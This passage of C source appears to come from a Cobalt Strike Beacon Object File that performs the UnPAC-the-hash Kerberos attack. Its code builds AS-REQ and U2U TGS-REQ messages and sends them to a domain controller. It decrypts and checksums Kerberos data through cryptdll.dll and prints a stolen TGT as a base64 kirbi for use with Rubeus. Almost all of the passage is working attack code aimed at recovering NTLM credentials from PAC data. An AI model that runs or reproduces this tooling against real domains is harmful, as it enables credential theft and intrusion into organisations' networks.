    asReqOffset += padataOuterTagLen;
    free(padataSeq);
    free(padataOuterSeq);
    free(padataOuterTag);

    /* req-body [4] KDC-REQ-BODY */
    int reqBodyTagLen;
    BYTE* reqBodyTag = BuildContextTag(4, reqBody, reqBodyLen, &reqBodyTagLen);
    memcpy(asReqContent + asReqOffset, reqBodyTag, reqBodyTagLen);
    asReqOffset += reqBodyTagLen;
    free(reqBody);
    free(reqBodyTag);

    /* Wrap in SEQUENCE */
    int asReqSeqLen;
    BYTE* asReqSeq = BuildSequence(asReqContent, asReqOffset, &asReqSeqLen);

    /* Wrap in APPLICATION 10 (AS-REQ) */
    result = BuildApplication(KRB_AS_REQ, asReqSeq, asReqSeqLen, outLen);
    free(asReqSeq);

cleanup:
    free(realm);
    free(padataContent);
    free(asReqContent);
    return result;
}

/*
 * =============================================================================
 * Network - Send to KDC
 * =============================================================================
 */

static BYTE* SendToKdc(const char* kdcHost, int port, BYTE* data, int dataLen, int* respLen) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in server;
    struct hostent* host;
    BYTE* response = NULL;
    BYTE lengthPrefix[4];
    DWORD totalLen;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] WSAStartup failed");
        return NULL;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Socket creation failed");
        WSACleanup();
        return NULL;
    }

    /* Resolve hostname */
    host = gethostbyname(kdcHost);
    if (!host) {
        server.sin_addr.s_addr = inet_addr(kdcHost);
        if (server.sin_addr.s_addr == INADDR_NONE) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to resolve %s", kdcHost);
            closesocket(sock);
            WSACleanup();
            return NULL;
        }
    } else {
        memcpy(&server.sin_addr, host->h_addr_list[0], host->h_length);
    }
    server.sin_family = AF_INET;
    server.sin_port = htons((unsigned short)port);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Connection failed");
        closesocket(sock);
        WSACleanup();
        return NULL;
    }

    /* Send with 4-byte length prefix (big-endian) */
    totalLen = htonl(dataLen);
    memcpy(lengthPrefix, &totalLen, 4);
    send(sock, (char*)lengthPrefix, 4, 0);
    send(sock, (char*)data, dataLen, 0);

    /* Receive response length */
    if (recv(sock, (char*)lengthPrefix, 4, 0) != 4) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to receive response length");
        closesocket(sock);
        WSACleanup();
        return NULL;
    }

    memcpy(&totalLen, lengthPrefix, 4);
    *respLen = ntohl(totalLen);

    if (*respLen <= 0 || *respLen > 100000) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Invalid response length: %d", *respLen);
        closesocket(sock);
        WSACleanup();
        return NULL;
    }

    /* Receive response */
    response = (BYTE*)malloc(*respLen);
    int received = 0;
    while (received < *respLen) {
        int r = recv(sock, (char*)response + received, *respLen - received, 0);
        if (r <= 0) break;
        received += r;
    }

    closesocket(sock);
    WSACleanup();

    return response;
}

/*
 * =============================================================================
 * UnPAC-the-hash - Kerberos Decryption
 * =============================================================================
 */

static BYTE* KerberosDecrypt(int eType, int keyUsage, BYTE* key, int keyLen,
                              BYTE* data, int dataLen, int* outLen) {
    HMODULE hCryptDll = NULL;
    CDLocateCSystem_t pCDLocateCSystem = NULL;
    KERB_ECRYPT* pCSystem = NULL;
    void* pContext = NULL;
    BYTE* output = NULL;
    int status;

    hCryptDll = LoadLibraryA("cryptdll.dll");
    if (!hCryptDll) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to load cryptdll.dll");
        return NULL;
    }

    pCDLocateCSystem = (CDLocateCSystem_t)GetProcAddress(hCryptDll, "CDLocateCSystem");
    if (!pCDLocateCSystem) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to find CDLocateCSystem");
        FreeLibrary(hCryptDll);
        return NULL;
    }

    status = pCDLocateCSystem(eType, (void**)&pCSystem);
    if (status != 0 || !pCSystem) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CDLocateCSystem failed: 0x%X", status);
        FreeLibrary(hCryptDll);
        return NULL;
    }

    /* Get function pointers from KERB_ECRYPT structure */
    KERB_ECRYPT_Initialize initFunc = (KERB_ECRYPT_Initialize)pCSystem->Initialize;
    KERB_ECRYPT_Decrypt decryptFunc = (KERB_ECRYPT_Decrypt)pCSystem->Decrypt;
    KERB_ECRYPT_Finish finishFunc = (KERB_ECRYPT_Finish)pCSystem->Finish;

    /* Initialize decryption context */
    status = initFunc(key, keyLen, keyUsage, &pContext);
    if (status != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Decrypt Initialize failed: 0x%X", status);
        FreeLibrary(hCryptDll);
        return NULL;
    }

    /* Calculate output size */
    int outputSize = dataLen;
    if (dataLen % pCSystem->BlockSize != 0) {
        outputSize += pCSystem->BlockSize - (dataLen % pCSystem->BlockSize);
    }
    outputSize += pCSystem->Size;

    output = (BYTE*)malloc(outputSize);

    /* Decrypt */
    status = decryptFunc(pContext, data, dataLen, output, &outputSize);
    finishFunc(&pContext);

    if (status != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Decrypt failed: 0x%X", status);
        free(output);
        FreeLibrary(hCryptDll);
        return NULL;
    }

    *outLen = outputSize;
    FreeLibrary(hCryptDll);
    return output;
}

/*
 * =============================================================================
 * U2U - Kerberos Encryption
 * =============================================================================
 */

typedef int (WINAPI *KERB_ECRYPT_Encrypt)(void* pContext, BYTE* data, int dataSize, BYTE* output, int* outputSize);

static BYTE* KerberosEncrypt(int eType, int keyUsage, BYTE* key, int keyLen,
                              BYTE* data, int dataLen, int* outLen) {
    HMODULE hCryptDll = NULL;
    CDLocateCSystem_t pCDLocateCSystem = NULL;
    KERB_ECRYPT* pCSystem = NULL;
    void* pContext = NULL;
    BYTE* output = NULL;
    int status;

    hCryptDll = LoadLibraryA("cryptdll.dll");
    if (!hCryptDll) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to load cryptdll.dll for encrypt");
        return NULL;
    }

    pCDLocateCSystem = (CDLocateCSystem_t)GetProcAddress(hCryptDll, "CDLocateCSystem");
    if (!pCDLocateCSystem) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to find CDLocateCSystem");
        FreeLibrary(hCryptDll);
        return NULL;
    }

    status = pCDLocateCSystem(eType, (void**)&pCSystem);
    if (status != 0 || !pCSystem) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CDLocateCSystem failed for encrypt: 0x%X", status);
        FreeLibrary(hCryptDll);
        return NULL;
    }

    /* Get function pointers */
    KERB_ECRYPT_Initialize initFunc = (KERB_ECRYPT_Initialize)pCSystem->Initialize;
    KERB_ECRYPT_Encrypt encryptFunc = (KERB_ECRYPT_Encrypt)pCSystem->Encrypt;
    KERB_ECRYPT_Finish finishFunc = (KERB_ECRYPT_Finish)pCSystem->Finish;

    /* Initialize encryption context */
    status = initFunc(key, keyLen, keyUsage, &pContext);
    if (status != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Encrypt Initialize failed: 0x%X", status);
        FreeLibrary(hCryptDll);
        return NULL;
    }

    /* Output size = data + checksum + confounder overhead */
    int outputSize = dataLen + pCSystem->Size;
    output = (BYTE*)malloc(outputSize);

    /* Encrypt */
    status = encryptFunc(pContext, data, dataLen, output, &outputSize);
    finishFunc(&pContext);

    if (status != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Encrypt failed: 0x%X", status);
        free(output);
        FreeLibrary(hCryptDll);
        return NULL;
    }

    *outLen = outputSize;
    FreeLibrary(hCryptDll);
    return output;
}

/*
 * =============================================================================
 * U2U - Kerberos Checksum (HMAC-SHA1-96-AES256)
 * =============================================================================
 */

typedef struct _KERB_CHECKSUM {
    int Type;
    int Size;
    int Flag;
    void* Initialize;
    void* Sum;
    void* Finalize;
    void* Finish;
    void* InitializeEx;
    void* InitializeEx2;
} KERB_CHECKSUM;

typedef int (WINAPI *KERB_CHECKSUM_InitializeEx)(BYTE* key, int keySize, int keyUsage, void** pContext);
typedef int (WINAPI *KERB_CHECKSUM_Sum)(void* pContext, int dataSize, BYTE* data);
typedef int (WINAPI *KERB_CHECKSUM_Finalize)(void* pContext, BYTE* output);
typedef int (WINAPI *KERB_CHECKSUM_Finish)(void** pContext);

#define KERB_CHECKSUM_HMAC_SHA1_96_AES256 16

static BYTE* ComputeKerberosChecksum(BYTE* key, int keyLen, BYTE* data, int dataLen, int keyUsage, int* checksumLen) {
    HMODULE hCryptDll = NULL;
    CDLocateCheckSum_t pCDLocateCheckSum = NULL;
    KERB_CHECKSUM* pCheckSum = NULL;
    void* pContext = NULL;
    BYTE* output = NULL;
    int status;

    hCryptDll = LoadLibraryA("cryptdll.dll");
    if (!hCryptDll) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to load cryptdll.dll for checksum");
        return NULL;
    }

    pCDLocateCheckSum = (CDLocateCheckSum_t)GetProcAddress(hCryptDll, "CDLocateCheckSum");
    if (!pCDLocateCheckSum) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to find CDLocateCheckSum");
        FreeLibrary(hCryptDll);
        return NULL;
    }

    status = pCDLocateCheckSum(KERB_CHECKSUM_HMAC_SHA1_96_AES256, (void**)&pCheckSum);
    if (status != 0 || !pCheckSum) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CDLocateCheckSum failed: 0x%X", status);
        FreeLibrary(hCryptDll);
        return NULL;
    }

    /* Get function pointers */
    KERB_CHECKSUM_InitializeEx initExFunc = (KERB_CHECKSUM_InitializeEx)pCheckSum->InitializeEx;
    KERB_CHECKSUM_Sum sumFunc = (KERB_CHECKSUM_Sum)pCheckSum->Sum;
    KERB_CHECKSUM_Finalize finalizeFunc = (KERB_CHECKSUM_Finalize)pCheckSum->Finalize;
    KERB_CHECKSUM_Finish finishFunc = (KERB_CHECKSUM_Finish)pCheckSum->Finish;

    /* Initialize with key */
    status = initExFunc(key, keyLen, keyUsage, &pContext);
    if (status != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Checksum InitializeEx failed: 0x%X", status);
        FreeLibrary(hCryptDll);
        return NULL;
    }

    /* Sum the data */
    status = sumFunc(pContext, dataLen, data);
    if (status != 0) {
        finishFunc(&pContext);
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Checksum Sum failed: 0x%X", status);
        FreeLibrary(hCryptDll);
        return NULL;
    }

    /* Finalize */
    *checksumLen = pCheckSum->Size;
    output = (BYTE*)malloc(*checksumLen);
    status = finalizeFunc(pContext, output);
    finishFunc(&pContext);

    if (status != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Checksum Finalize failed: 0x%X", status);
        free(output);
        FreeLibrary(hCryptDll);
        return NULL;
    }

    FreeLibrary(hCryptDll);
    return output;
}

/*
 * =============================================================================
 * U2U - Forward Declarations
 * =============================================================================
 */

/* Forward declarations for functions defined later */
static BYTE* ExtractPacFromAuthData(BYTE* authData, int authDataLen, int* pacLen);
static const char* GetKrbErrorDesc(int code);
static void ParsePacCredentialData(BYTE* data, int dataLen);

/*
 * =============================================================================
 * KRB-CRED (kirbi) Builder - Rubeus compatible output
 * =============================================================================
 */

static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessionKeyLen,
                        int encType, const char* user, const char* realm) {
    /*
     * Build minimal KRB-CRED structure for TGT export
     * KRB-CRED ::= [APPLICATION 22] SEQUENCE {
     *   pvno [0] INTEGER (5),
     *   msg-type [1] INTEGER (22),
     *   tickets [2] SEQUENCE OF Ticket,
     *   enc-part [3] EncryptedData { etype 0, cipher: EncKrbCredPart }
     * }
     */
    BYTE* kirbi = (BYTE*)malloc(ticketLen + sessionKeyLen + 1024);
    int kOffset = 0;
    int i;
    char* b64 = NULL;
    DWORD b64Len = 0;

    /* Build KrbCredInfo */
    BYTE* credInfo = (BYTE*)malloc(sessionKeyLen + 512);
    int ciOffset = 0;

    /* key [0] EncryptionKey { etype [0], keyvalue [1] } */
    BYTE keyContent[64];
    int keyOffset = 0;
    /* etype */
    keyContent[keyOffset++] = 0xA0;
    keyContent[keyOffset++] = 0x03;
    keyContent[keyOffset++] = 0x02;
    keyContent[keyOffset++] = 0x01;
    keyContent[keyOffset++] = (BYTE)encType;
    /* keyvalue */
    keyContent[keyOffset++] = 0xA1;
    keyContent[keyOffset++] = (BYTE)(sessionKeyLen + 2);
    keyContent[keyOffset++] = 0x04;
    keyContent[keyOffset++] = (BYTE)sessionKeyLen;
    memcpy(keyContent + keyOffset, sessionKey, sessionKeyLen);
    keyOffset += sessionKeyLen;

    credInfo[ciOffset++] = 0xA0; /* [0] key */
    credInfo[ciOffset++] = (BYTE)(keyOffset + 2);
    credInfo[ciOffset++] = 0x30;
    credInfo[ciOffset++] = (BYTE)keyOffset;
    memcpy(credInfo + ciOffset, keyContent, keyOffset);
    ciOffset += keyOffset;

    /* prealm [1] */
    int realmLen = (int)strlen(realm);
    credInfo[ciOffset++] = 0xA1;
    credInfo[ciOffset++] = (BYTE)(realmLen + 2);
    credInfo[ciOffset++] = 0x1B; /* GeneralString */
    credInfo[ciOffset++] = (BYTE)realmLen;
    memcpy(credInfo + ciOffset, realm, realmLen);
    ciOffset += realmLen;

    /* pname [2] PrincipalName { name-type [0] = 1, name-string [1] } */
    int userLen = (int)strlen(user);
    BYTE pnameContent[128];
    int pnOffset = 0;
    pnameContent[pnOffset++] = 0xA0;
    pnameContent[pnOffset++] = 0x03;
    pnameContent[pnOffset++] = 0x02;
    pnameContent[pnOffset++] = 0x01;
    pnameContent[pnOffset++] = 0x01; /* NT-PRINCIPAL */
    pnameContent[pnOffset++] = 0xA1;
    pnameContent[pnOffset++] = (BYTE)(userLen + 4);
    pnameContent[pnOffset++] = 0x30;
    pnameContent[pnOffset++] = (BYTE)(userLen + 2);
    pnameContent[pnOffset++] = 0x1B;
    pnameContent[pnOffset++] = (BYTE)userLen;
    memcpy(pnameContent + pnOffset, user, userLen);
    pnOffset += userLen;

    credInfo[ciOffset++] = 0xA2;
    credInfo[ciOffset++] = (BYTE)(pnOffset + 2);
    credInfo[ciOffset++] = 0x30;
    credInfo[ciOffset++] = (BYTE)pnOffset;
    memcpy(credInfo + ciOffset, pnameContent, pnOffset);
    ciOffset += pnOffset;

    /* srealm [8] */
    credInfo[ciOffset++] = 0xA8;
    credInfo[ciOffset++] = (BYTE)(realmLen + 2);
    credInfo[ciOffset++] = 0x1B;
    credInfo[ciOffset++] = (BYTE)realmLen;
    memcpy(credInfo + ciOffset, realm, realmLen);
    ciOffset += realmLen;

    /* sname [9] krbtgt/REALM */
    BYTE snameContent[128];
    int snOffset = 0;
    snameContent[snOffset++] = 0xA0;
    snameContent[snOffset++] = 0x03;
    snameContent[snOffset++] = 0x02;
    snameContent[snOffset++] = 0x01;
    snameContent[snOffset++] = 0x02; /* NT-SRV-INST */
    snameContent[snOffset++] = 0xA1;
    snameContent[snOffset++] = (BYTE)(6 + 2 + realmLen + 2 + 2);
    snameContent[snOffset++] = 0x30;
    snameContent[snOffset++] = (BYTE)(6 + 2 + realmLen + 2);
    snameContent[snOffset++] = 0x1B;
    snameContent[snOffset++] = 0x06;
    memcpy(snameContent + snOffset, "krbtgt", 6);
    snOffset += 6;
    snameContent[snOffset++] = 0x1B;
    snameContent[snOffset++] = (BYTE)realmLen;
    memcpy(snameContent + snOffset, realm, realmLen);
    snOffset += realmLen;

    credInfo[ciOffset++] = 0xA9;
    credInfo[ciOffset++] = (BYTE)(snOffset + 2);
    credInfo[ciOffset++] = 0x30;
    credInfo[ciOffset++] = (BYTE)snOffset;
    memcpy(credInfo + ciOffset, snameContent, snOffset);
    ciOffset += snOffset;

    /* Build EncKrbCredPart [APPLICATION 29] */
    BYTE* encCredPart = (BYTE*)malloc(ciOffset + 64);
    int ecpOffset = 0;
    /* ticket-info [0] SEQUENCE OF KrbCredInfo */
    encCredPart[ecpOffset++] = 0xA0;
    int seqLen = ciOffset + 2;
    if (seqLen < 128) {
        encCredPart[ecpOffset++] = (BYTE)seqLen;
    } else {
        encCredPart[ecpOffset++] = 0x82;
        encCredPart[ecpOffset++] = (BYTE)(seqLen >> 8);
        encCredPart[ecpOffset++] = (BYTE)(seqLen & 0xFF);
    }
    encCredPart[ecpOffset++] = 0x30; /* SEQUENCE OF */
    if (ciOffset < 128) {
        encCredPart[ecpOffset++] = (BYTE)ciOffset;
    } else {
        encCredPart[ecpOffset++] = 0x82;
        encCredPart[ecpOffset++] = (BYTE)(ciOffset >> 8);
        encCredPart[ecpOffset++] = (BYTE)(ciOffset & 0xFF);
    }
    /* KrbCredInfo SEQUENCE */
    int credInfoSeqOffset = ecpOffset;
    encCredPart[ecpOffset++] = 0x30;
    if (ciOffset < 128) {
        encCredPart[ecpOffset++] = (BYTE)ciOffset;
    } else {
        encCredPart[ecpOffset++] = 0x82;
        encCredPart[ecpOffset++] = (BYTE)(ciOffset >> 8);
        encCredPart[ecpOffset++] = (BYTE)(ciOffset & 0xFF);
    }
    memcpy(encCredPart + ecpOffset, credInfo, ciOffset);
    ecpOffset += ciOffset;

    /* Wrap in [APPLICATION 29] */
    BYTE* app29 = (BYTE*)malloc(ecpOffset + 8);
    int a29Offset = 0;
    app29[a29Offset++] = 0x7D; /* [APPLICATION 29] */
    if (ecpOffset + 2 < 128) {
        app29[a29Offset++] = (BYTE)(ecpOffset + 2);
    } else {
        app29[a29Offset++] = 0x82;
        app29[a29Offset++] = (BYTE)((ecpOffset + 2) >> 8);
        app29[a29Offset++] = (BYTE)((ecpOffset + 2) & 0xFF);
    }
    app29[a29Offset++] = 0x30;
    if (ecpOffset < 128) {
        app29[a29Offset++] = (BYTE)ecpOffset;
    } else {
        app29[a29Offset++] = 0x82;
        app29[a29Offset++] = (BYTE)(ecpOffset >> 8);
        app29[a29Offset++] = (BYTE)(ecpOffset & 0xFF);
    }
    memcpy(app29 + a29Offset, encCredPart, ecpOffset);
    a29Offset += ecpOffset;

    /* Build enc-part EncryptedData { etype [0] = 0, cipher [2] } */
    BYTE* encPart = (BYTE*)malloc(a29Offset + 32);
    int epOffset = 0;
    /* etype [0] INTEGER 0 */
    encPart[epOffset++] = 0xA0;
    encPart[epOffset++] = 0x03;
    encPart[epOffset++] = 0x02;
    encPart[epOffset++] = 0x01;
    encPart[epOffset++] = 0x00;
    /* cipher [2] OCTET STRING */
    encPart[epOffset++] = 0xA2;
    if (a29Offset + 2 < 128) {
        encPart[epOffset++] = (BYTE)(a29Offset + 2);
    } else {
        encPart[epOffset++] = 0x82;
        encPart[epOffset++] = (BYTE)((a29Offset + 2) >> 8);
        encPart[epOffset++] = (BYTE)((a29Offset + 2) & 0xFF);
    }
    encPart[epOffset++] = 0x04;
    if (a29Offset < 128) {
        encPart[epOffset++] = (BYTE)a29Offset;
    } else {
        encPart[epOffset++] = 0x82;
        encPart[epOffset++] = (BYTE)(a29Offset >> 8);
        encPart[epOffset++] = (BYTE)(a29Offset & 0xFF);
    }
    memcpy(encPart + epOffset, app29, a29Offset);
    epOffset += a29Offset;

    /* Wrap enc-part in SEQUENCE */
    BYTE* encPartSeq = (BYTE*)malloc(epOffset + 8);
    int epsOffset = 0;
    encPartSeq[epsOffset++] = 0x30;
    if (epOffset < 128) {
        encPartSeq[epsOffset++] = (BYTE)epOffset;
    } else {
        encPartSeq[epsOffset++] = 0x82;
        encPartSeq[epsOffset++] = (BYTE)(epOffset >> 8);
        encPartSeq[epsOffset++] = (BYTE)(epOffset & 0xFF);
    }
    memcpy(encPartSeq + epsOffset, encPart, epOffset);
    epsOffset += epOffset;

    /* Build KRB-CRED body */
    /* pvno [0] INTEGER 5 */
    kirbi[kOffset++] = 0xA0;
    kirbi[kOffset++] = 0x03;
    kirbi[kOffset++] = 0x02;
    kirbi[kOffset++] = 0x01;
    kirbi[kOffset++] = 0x05;
    /* msg-type [1] INTEGER 22 */
    kirbi[kOffset++] = 0xA1;
    kirbi[kOffset++] = 0x03;
    kirbi[kOffset++] = 0x02;
    kirbi[kOffset++] = 0x01;
    kirbi[kOffset++] = 0x16;
    /* tickets [2] SEQUENCE OF Ticket */
    kirbi[kOffset++] = 0xA2;
    if (ticketLen + 2 < 128) {
        kirbi[kOffset++] = (BYTE)(ticketLen + 2);
    } else {
        kirbi[kOffset++] = 0x82;
        kirbi[kOffset++] = (BYTE)((ticketLen + 2) >> 8);
        kirbi[kOffset++] = (BYTE)((ticketLen + 2) & 0xFF);
    }
    kirbi[kOffset++] = 0x30;
    if (ticketLen < 128) {
        kirbi[kOffset++] = (BYTE)ticketLen;
    } else {
        kirbi[kOffset++] = 0x82;
        kirbi[kOffset++] = (BYTE)(ticketLen >> 8);
        kirbi[kOffset++] = (BYTE)(ticketLen & 0xFF);
    }
    memcpy(kirbi + kOffset, ticket, ticketLen);
    kOffset += ticketLen;
    /* enc-part [3] */
    kirbi[kOffset++] = 0xA3;
    if (epsOffset < 128) {
        kirbi[kOffset++] = (BYTE)epsOffset;
    } else {
        kirbi[kOffset++] = 0x82;
        kirbi[kOffset++] = (BYTE)(epsOffset >> 8);
        kirbi[kOffset++] = (BYTE)(epsOffset & 0xFF);
    }
    memcpy(kirbi + kOffset, encPartSeq, epsOffset);
    kOffset += epsOffset;

    /* Wrap in SEQUENCE and [APPLICATION 22] */
    BYTE* final = (BYTE*)malloc(kOffset + 16);
    int fOffset = 0;
    final[fOffset++] = 0x76; /* [APPLICATION 22] */
    if (kOffset + 2 < 128) {
        final[fOffset++] = (BYTE)(kOffset + 2);
    } else {
        final[fOffset++] = 0x82;
        final[fOffset++] = (BYTE)((kOffset + 2) >> 8);
        final[fOffset++] = (BYTE)((kOffset + 2) & 0xFF);
    }
    final[fOffset++] = 0x30;
    if (kOffset < 128) {
        final[fOffset++] = (BYTE)kOffset;
    } else {
        final[fOffset++] = 0x82;
        final[fOffset++] = (BYTE)(kOffset >> 8);
        final[fOffset++] = (BYTE)(kOffset & 0xFF);
    }
    memcpy(final + fOffset, kirbi, kOffset);
    fOffset += kOffset;

    /* Convert to base64 */
    CryptBinaryToStringA(final, fOffset, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &b64Len);
    b64 = (char*)malloc(b64Len + 1);
    CryptBinaryToStringA(final, fOffset, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64, &b64Len);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] TGT (kirbi, base64):");
    BeaconPrintf(CALLBACK_OUTPUT, "%s", b64);

    free(b64);
    free(final);
    free(kirbi);
    free(credInfo);
    free(encCredPart);
    free(app29);
    free(encPart);
    free(encPartSeq);
}

/*
 * =============================================================================
 * U2U - Extract Ticket from AS-REP
 * =============================================================================
 */

static BYTE* ExtractTicketFromAsRep(BYTE* asRep, int asRepLen, int* ticketLen) {
    int offset = 0;
    int length;

    /* Skip APPLICATION 11 tag */
    if (asRep[offset] == 0x6B) {
        offset++;
        offset += DecodeLength(asRep, offset, &length);
    }

    /* Skip outer SEQUENCE */
    if (asRep[offset] == 0x30) {
        offset++;
        offset += DecodeLength(asRep, offset, &length);
    }

    /* Find ticket [5] */
    while (offset < asRepLen - 10) {
        if (asRep[offset] == 0xA5) {
            offset++;
            offset += DecodeLength(asRep, offset, &length);

            /* The ticket starts here (APPLICATION 1) */
            *ticketLen = length;
            BYTE* ticket = (BYTE*)malloc(length);
            memcpy(ticket, asRep + offset, length);
            return ticket;
        } else if ((asRep[offset] & 0xE0) == 0xA0) {
            offset++;
            int skipLen;
            offset += DecodeLength(asRep, offset, &skipLen);
            offset += skipLen;
        } else {
            offset++;
        }
    }

    *ticketLen = 0;
    return NULL;
}

/*
 * =============================================================================
 * U2U - Build TGS-REQ Structures
 * =============================================================================
 */

/* Key usages for U2U */
#define KRB_KEY_USAGE_TGS_REQ_AUTH_CKSUM    6
#define KRB_KEY_USAGE_TGS_REQ_AUTH          7
#define KRB_KEY_USAGE_TGS_REP_ENCPART_SESSKEY 8
#define KRB_KEY_USAGE_TICKET_ENCPART        2

/* Global storage for U2U */
static BYTE* g_lastTgt = NULL;
static int g_lastTgtLen = 0;
static char g_lastUser[256] = {0};
static char g_lastRealm[256] = {0};
static char g_lastKdc[256] = {0};

/* Build U2U Authenticator */
static BYTE* BuildU2UAuthenticator(const char* user, const char* realm, BYTE* sessionKey, int sessionKeyLen,
                                    BYTE* reqBody, int reqBodyLen, int* outLen) {
    BYTE* authContent = (BYTE*)malloc(4096);
    int offset = 0;
    int i;

    /* authenticator-vno [0] INTEGER 5 */
    int vnoLen;
    BYTE* vno = BuildInteger(5, &vnoLen);
    int vnoTagLen;
    BYTE* vnoTag = BuildContextTag(0, vno, vnoLen, &vnoTagLen);
    memcpy(authContent + offset, vnoTag, vnoTagLen);
    offset += vnoTagLen;
    free(vno);
    free(vnoTag);

    /* crealm [1] GeneralString */
    int realmStrLen;
    BYTE* realmStr = BuildGeneralString(realm, &realmStrLen);
    int realmTagLen;
    BYTE* realmTag = BuildContextTag(1, realmStr, realmStrLen, &realmTagLen);
    memcpy(authContent + offset, realmTag, realmTagLen);
    offset += realmTagLen;
    free(realmStr);
    free(realmTag);

    /* cname [2] PrincipalName */
    int cnameLen;
    BYTE* cname = BuildPrincipalName(1, user, NULL, &cnameLen);
    int cnameTagLen;
    BYTE* cnameTag = BuildContextTag(2, cname, cnameLen, &cnameTagLen);
    memcpy(authContent + offset, cnameTag, cnameTagLen);
    offset += cnameTagLen;
    free(cname);
    free(cnameTag);

    /* cksum [3] Checksum - checksum of req-body */
    /* Checksum ::= SEQUENCE { cksumtype [0] Int32, checksum [1] OCTET STRING } */
    int checksumValueLen;
    BYTE* checksumValue = ComputeKerberosChecksum(sessionKey, sessionKeyLen, reqBody, reqBodyLen,
                                                   KRB_KEY_USAGE_TGS_REQ_AUTH_CKSUM, &checksumValueLen);
    if (checksumValue) {
        BYTE cksumContent[64];
        int cksumOffset = 0;

        /* cksumtype [0] INTEGER 16 */
        int ctypeLen;
        BYTE* ctype = BuildInteger(KERB_CHECKSUM_HMAC_SHA1_96_AES256, &ctypeLen);
        int ctypeTagLen;
        BYTE* ctypeTag = BuildContextTag(0, ctype, ctypeLen, &ctypeTagLen);
        memcpy(cksumContent + cksumOffset, ctypeTag, ctypeTagLen);
        cksumOffset += ctypeTagLen;
        free(ctype);
        free(ctypeTag);

        /* checksum [1] OCTET STRING */
        int cvalLen;
        BYTE* cval = BuildOctetString(checksumValue, checksumValueLen, &cvalLen);
        int cvalTagLen;
        BYTE* cvalTag = BuildContextTag(1, cval, cvalLen, &cvalTagLen);
        memcpy(cksumContent + cksumOffset, cvalTag, cvalTagLen);
        cksumOffset += cvalTagLen;
        free(cval);
        free(cvalTag);
        free(checksumValue);

        int cksumSeqLen;
        BYTE* cksumSeq = BuildSequence(cksumContent, cksumOffset, &cksumSeqLen);
        int cksumTagLen;
        BYTE* cksumTag = BuildContextTag(3, cksumSeq, cksumSeqLen, &cksumTagLen);
        memcpy(authContent + offset, cksumTag, cksumTagLen);
        offset += cksumTagLen;
        free(cksumSeq);
        free(cksumTag);
    }

    /* cusec [4] Microseconds */
    SYSTEMTIME st;
    GetSystemTime(&st);
    int cusec = st.wMilliseconds * 1000;
    int cusecLen;
    BYTE* cusecInt = BuildInteger(cusec, &cusecLen);
    int cusecTagLen;
    BYTE* cusecTag = BuildContextTag(4, cusecInt, cusecLen, &cusecTagLen);
    memcpy(authContent + offset, cusecTag, cusecTagLen);
    offset += cusecTagLen;
    free(cusecInt);
    free(cusecTag);

    /* ctime [5] KerberosTime */
    char timeStr[32];
    sprintf(timeStr, "%04d%02d%02d%02d%02d%02dZ",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    int ctimeLen;
    BYTE* ctime = BuildGeneralizedTime(timeStr, &ctimeLen);
    int ctimeTagLen;
    BYTE* ctimeTag = BuildContextTag(5, ctime, ctimeLen, &ctimeTagLen);
    memcpy(authContent + offset, ctimeTag, ctimeTagLen);
    offset += ctimeTagLen;
    free(ctime);
    free(ctimeTag);

    /* Build Authenticator SEQUENCE */
    int authSeqLen;
    BYTE* authSeq = BuildSequence(authContent, offset, &authSeqLen);
    free(authContent);

    /* Wrap in APPLICATION 2 */
    BYTE* result = BuildApplication(2, authSeq, authSeqLen, outLen);
    free(authSeq);

    return result;
}

/* Build U2U AP-REQ */
static BYTE* BuildU2UApReq(BYTE* ticket, int ticketLen, BYTE* encAuthenticator, int encAuthLen, int* outLen) {
    BYTE* apReqContent = (BYTE*)malloc(ticketLen + encAuthLen + 256);
    int offset = 0;

    /* pvno [0] INTEGER 5 */
    int pvnoLen;
    BYTE* pvno = BuildInteger(5, &pvnoLen);
    int pvnoTagLen;
    BYTE* pvnoTag = BuildContextTag(0, pvno, pvnoLen, &pvnoTagLen);
    memcpy(apReqContent + offset, pvnoTag, pvnoTagLen);
    offset += pvnoTagLen;
    free(pvno);
    free(pvnoTag);

    /* msg-type [1] INTEGER 14 (AP-REQ) */
    int mtLen;
    BYTE* mt = BuildInteger(14, &mtLen);
    int mtTagLen;
    BYTE* mtTag = BuildContextTag(1, mt, mtLen, &mtTagLen);
    memcpy(apReqContent + offset, mtTag, mtTagLen);
    offset += mtTagLen;
    free(mt);
    free(mtTag);

    /* ap-options [2] BIT STRING (no options) */
    BYTE apOptions[] = { 0x00, 0x00, 0x00, 0x00 };
    int apOptBsLen;
    BYTE* apOptBs = BuildBitString(apOptions, 4, &apOptBsLen);
    int apOptTagLen;
